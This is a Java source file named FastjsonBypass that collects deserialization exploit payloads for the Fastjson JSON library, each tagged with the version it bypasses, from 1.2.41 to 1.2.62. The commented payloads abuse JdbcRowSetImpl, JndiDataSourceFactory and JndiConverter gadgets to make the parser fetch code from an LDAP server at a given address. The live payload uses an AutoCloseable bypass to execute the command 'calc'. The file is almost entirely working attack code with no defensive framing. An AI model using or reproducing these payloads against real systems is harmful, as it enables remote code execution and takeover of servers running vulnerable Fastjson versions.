package payloads;

import com.alibaba.fastjson.JSON;


public class FastjsonBypass {
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        1.2.41
//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://192.168.2.1:1389/4l7ktw\",\"autoCommit\":\"true\" }";

//        1.2.42
//        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://192.168.2.1:1389/4l7ktw\",\"autoCommit\":\"true\" }";

//        1.2.43
//        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://192.168.2.1:1389/4l7ktw\",\"autoCommit\":\"true\" }";

//        1.2.45
//        String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," + "\"properties\":{\"data_source\":\"ldap://192.168.2.1:1389/4l7ktw\"}}";

//        1.2.47

//        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," + "\"dataSourceName\":\"ldap://192.168.2.1:1389/4l7ktw\",\"autoCommit\":true}}";

//        1.2.62
//        String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," + "\"AsText\":\"ldap://127.0.0.1:1234/ExportObject\"}";

        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"payloads.VulAutoCloseable\",\"cmd\":\"calc\"}";
        JSON.parse(payload);
    }
}
